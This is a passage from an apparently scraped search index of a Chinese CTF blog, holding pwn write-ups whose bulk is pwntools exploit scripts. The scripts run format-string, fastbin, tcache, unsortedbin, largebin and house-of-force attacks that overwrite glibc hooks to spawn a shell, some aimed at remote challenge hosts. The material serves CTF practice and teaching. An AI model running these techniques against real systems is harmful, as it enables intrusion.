    delete(0)
    edit(0,p64(malloc_hook-0x23))
    add(0x60,11,b&amp;quot;aaa&amp;quot;)
    add(0x60,12,cyclic(0x13)+p64(shell))

    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;weapon: &amp;quot;,b&amp;quot;24&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,b&amp;quot;13&amp;quot;)

    io.interactive()

while True:
    try:
        shh()
    except:
        io.close()
        continue
# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">de1ctf_2019_weapon wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/Z96YulOXT1/"" data-c="
          &lt;p&gt;格式化字符串任意写，打&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;泄露libc&lt;br&gt;
然后再次利用格式化字符串打realloc调栈的one_gadget&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28168)
# io=process(&amp;quot;./note&amp;quot;)
elf=ELF(&amp;quot;./note&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)
    
def fmt(t,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;say ? &amp;quot;,t)
    io.sendlineafter(b&amp;quot;? &amp;quot;,cc)
    
def show():
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)


# gdb.attach(io)
# pause()

payload=p64(0xfbad1887)+p64(0)*3
fmt(b&amp;quot;%7$saaaa&amp;quot;,payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x1430-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226, 0x4527a, 0xf03a4, 0xf1247]
shell=leak_addr+one_gadget[1]

# add(0x90,b&amp;quot;aaa&amp;quot;)
# fmt %7$s

payload=p64(shell)+p64(realloc+0xc)
fmt(b&amp;quot;%7$saaaa&amp;quot;+p64(malloc_hook-0x8),payload)

# add(0x18,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;size: &amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">祥云杯2021 note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/A5pkR-4c0/"" data-c="
          &lt;p&gt;64位格式化字符串，got表可写&lt;br&gt;
第一次泄露libc基址和劫持&lt;code&gt;fini_array&lt;/code&gt;为main&lt;br&gt;
程序自带的puts里有&lt;code&gt;;sh&lt;/code&gt;，&lt;code&gt;;&lt;/code&gt;分隔符，如果劫持puts的got表为system，则可以getshell&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./fmtstr_level2&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28540)
elf=ELF(&amp;quot;./fmtstr_level2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

main=0x4011b6
fini_array=0x4031F0

io.recvuntil(b&amp;quot;ID\n&amp;quot;)
payload=b&amp;quot;%38$paaa&amp;quot;+fmtstr_payload(7,{fini_array:main},numbwritten=0x11)
###0x11为泄露的libc偏移地址+aaa的长度，14+3=17
io.send(payload)

leak_addr=int(io.recv(14),16)-0x1f12e8
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
payload=fmtstr_payload(6,{elf.got[b&amp;quot;puts&amp;quot;]:sys_addr})
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]fmtstr_level2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/IMfIGRuPB/"" data-c="
          &lt;p&gt;2.31&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28245)
io=process(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(s))
    io.sendafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))

for i in range(8):
    add(i,0x90,b&amp;quot;/bin/sh\x00&amp;quot;)

add(8,0x10,b&amp;quot;/bin/sh\x00&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

for i in range(0,10):
    add(i,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)

for i in range(0,7):
    delete(i)

gdb.attach(io)
pause()
    
delete(9)
delete(10)
delete(7)
delete(8)
delete(7)

for i in range(0,7):
    add(i,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
    
add(11,0x60,p64(free_hook))
add(12,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
add(13,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
add(14,0x60,p64(sys_addr))

delete(12)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME2022 oldfashion_note</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/z7v1q0WF_/"" data-c="
          &lt;h3 id=&#34;unsortedbin-attack&#34;&gt;Unsortedbin Attack:&lt;/h3&gt;
&lt;h4 id=&#34;hitcontraining_magicheap&#34;&gt;hitcontraining_magicheap:&lt;/h4&gt;
&lt;p&gt;低版本利用，控制bk位置内容，即可任意地址写&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* remove from unsorted list */
if (__glibc_unlikely (bck-&amp;gt;fd != victim))
 malloc_printerr (&amp;quot;malloc(): corrupted unsorted chunks 3&amp;quot;);
unsorted_chunks (av)-&amp;gt;bk = bck;
bck-&amp;gt;fd = unsorted_chunks (av);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27492)
# io=process(&amp;quot;./magicheap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size of Heap : &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content of heap:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size of Heap : &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content of heap : &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0x20,b&amp;quot;aaa&amp;quot;) #0
add(0x90,b&amp;quot;bbb&amp;quot;) #1
add(0x10,b&amp;quot;ccc&amp;quot;) #2

delete(1)
fd=0
bk=0x6020A0
edit(0,0x50,cyclic(0x20)+p64(0)+p64(0x91)+p64(fd)+p64(bk-0x10))
add(0x80,b&amp;quot;zzzz&amp;quot;)
io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4869&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;largebin-attack&#34;&gt;Largebin Attack：&lt;/h3&gt;
&lt;h4 id=&#34;hgame2023_large_note&#34;&gt;hgame2023_large_note:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1687409598772.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#注意0x10字节对齐
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28607)
io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x520)
add(1,0x600)
add(2,0x510)

delete(0)
edit(0,b&amp;quot;a&amp;quot;)
show(0)   #uaf泄露libc

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x61-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_=leak_addr+0x1e3280   #此处偏移是真的难找
tc_max_bins=mp_+0x50  #mp_.tcache_bins

edit(0,b&amp;quot;\x00&amp;quot;)
add(13,0x900)   #将chunk0分配到largebin

payload=p64(leak_addr+0x1e4030)*2+p64(tc_max_bins-0x20)*2  #注意检查，修改chunk 0的bk_nextsize为tc_max_bins - 0x20处，来达到任意地址写一个堆块地址

edit(0,payload)

delete(2) #分配chunk2 到unsortedbin

add(15,0x900) #分配一个大堆块出发largebin attack

# gdb.attach(io)
# pause()

delete(1)
payload=b&amp;quot;a&amp;quot;*0xe8+p64(free_hook) #固定偏移
edit(0,payload)

add(1,0x600) 

edit(1, p64(sys_addr))

add(6,0x600)
edit(6,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(6)  #劫持free_hook为system函数，free掉&amp;quot;/bin/sh&amp;quot;堆块即可

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Unsortedbin Attack&Largebin Attack</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dDqqLsIMs/"" data-c="
          &lt;h3 id=&#34;例题&#34;&gt;例题：&lt;/h3&gt;
&lt;h4 id=&#34;hitcon-training-lab-11&#34;&gt;HITCON training lab 11：&lt;/h4&gt;
&lt;p&gt;2.29之前版本利用&lt;br&gt;
修改top_chunk size为&lt;code&gt;-1&lt;/code&gt;无符号溢出为极大值绕过验证&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// 获取当前的top chunk，并计算其对应的大小
victim = av-&amp;gt;top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) &amp;gt;= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av-&amp;gt;top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &amp;amp;main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来测算偏移：&lt;br&gt;
&lt;code&gt;offset = chunk_addr - top_chunk_addr -0x20&lt;/code&gt;&lt;br&gt;
分配堆块&lt;code&gt;add(offset,&#39;&#39;)&lt;/code&gt;后可实现&lt;code&gt;chunk_addr&lt;/code&gt;处写&lt;br&gt;
此时再次&lt;code&gt;add&lt;/code&gt;即可改写当前地址内容&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27856)
io=process(&amp;quot;./bamboobox&amp;quot;)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(n,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;item:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,str(n))

def getshell():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;5&amp;quot;)

gdb.attach(io)
pause()

add(0x18,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;bbb&amp;quot;) #1
edit(1,0x58,cyclic(0x40)+p64(0)+p64(0xFFFFFFFFFFFFFFFF))

offset=-0x98
magic=0x400d49

add(offset,b&amp;quot;&amp;quot;) #2

add(0x18,p64(magic)*2)
getshell()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也可以fastbin attack：&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26837)
io=process(&amp;quot;./bamboobox&amp;quot;)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(s,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;item:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendafter(b&amp;quot;item:&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

add(0x18,b&amp;quot;e&amp;quot;) #0
add(0x18,b&amp;quot;a&amp;quot;) #1
add(0x90,b&amp;quot;c&amp;quot;) #2
add(0x10,b&amp;quot;d&amp;quot;) #3

edit(0,0x20,cyclic(0x10)+p64(0)+p64(0xc1))
delete(1)
add(0x10,b&amp;quot;aaaaaaaa&amp;quot;)
show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
one_gadget=[0x45206,0x4525a,0xef9f4,0xf0897]
shell=leak_addr+one_gadget[1]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]

add(0x60,b&amp;quot;/bin/sh&amp;quot;)
add(0x20,b&amp;quot;/bin/sh&amp;quot;)
delete(2)
payload=cyclic(0x18)+p64(0x21)+cyclic(0x18)+p64(0x71)+p64(malloc_hook-0x23)
edit(0,len(payload),payload)

add(0x60,b&amp;quot;aaa&amp;quot;)
add(0x60,cyclic(0xb)+p64(shell)+p64(realloc))

io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;name:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x45206 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4525a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xef9f4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf0897 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">House of force</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/Pr8A1aCmZ/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN：&lt;/h3&gt;
&lt;h4 id=&#34;fast_note&#34;&gt;fast_note:&lt;/h4&gt;
&lt;p&gt;uaf+fastbin attack,此题需要realloc调偏移才能打通one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28391)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x60,b&amp;quot;qqq&amp;quot;) #0
add(1,0x60,b&amp;quot;www&amp;quot;) #1
add(2,0x80,b&amp;quot;eee&amp;quot;) #2
add(3,0x10,b&amp;quot;rrr&amp;quot;) #3

delete(2)
add(4,0x80,b&amp;quot;A&amp;quot;*7+b&amp;quot;b&amp;quot;) #4
show(4)
#0,1,4,3
io.recvuntil(b&amp;quot;b&amp;quot;)
libc_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x58-0x3C4B20
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=libc_addr+one_gadget[3]

# gdb.attach(io)
# pause()

delete(0)
delete(1)
delete(0) #0-&amp;gt;1-&amp;gt;0

add(5,0x60,p64(malloc_hook-0x23))
add(6,0x60,b&amp;quot;aaa&amp;quot;)
add(7,0x60,b&amp;quot;qqq&amp;quot;)
add(8,0x60,cyclic(0xb)+p64(shell)+p64(realloc+0x6))

io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;9&amp;quot;)
io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(0x60))

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;editable_note&#34;&gt;editable_note:&lt;/h3&gt;
&lt;p&gt;tcachebin,uaf+free_hook&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#one_gadget条件限制太多了,打free_hook
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28799)
# io=process(&amp;quot;./vuln&amp;quot;)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)    
# pause()
    
for i in range(8):
    add(i,0x80)  
#8块，前7块free填满tcachebin,最后一块free进入unsortedbin
add(8,0x10)
#防止unlink与top_chunk合并
for i in range(8):
    delete(i)
    
show(7) #uaf
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

edit(6,p64(free_hook))
add(9,0x80)
add(10,0x80)
edit(10,p64(sys_addr))

add(11,0x20)
edit(11,b&amp;quot;/bin/sh&amp;quot;)
delete(11)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;new_fast_note&#34;&gt;new_fast_note:&lt;/h3&gt;
&lt;p&gt;此题存在uaf，没有edit函数，可以利用house of botcake创造chunk overlap来实现任意地址分配，劫持free_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;house of botcake：
绕过 tcache-&amp;gt;key 的检查：

申请 7 个大小相同，大小大于 0x80 的 chunk，再申请三个，分别为 chunk A 和 chunkB 和 chunk C
释放前 7 个和 chunk A，前面 7 个都会进入到 tcachebin 里面，chunk A 进入到 unsortedbin
释放 chunk B，则 chunk B 会和 chunk A 合并
从 tcachebin 分配走一个
再次释放 chunk B，此时 B 同时存在与 unsortedbin 和 tcachebin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(b&amp;quot;node3.anna.nssctf.cn&amp;quot;,28740)
# io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
        
# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x90,b&amp;quot;/bin/sh&amp;quot;)

add(8,0x90,b&amp;quot;/bin/sh&amp;quot;)
add(9,0x90,b&amp;quot;/bin/sh&amp;quot;)
add(10,0x10,b&amp;quot;/bin/sh&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
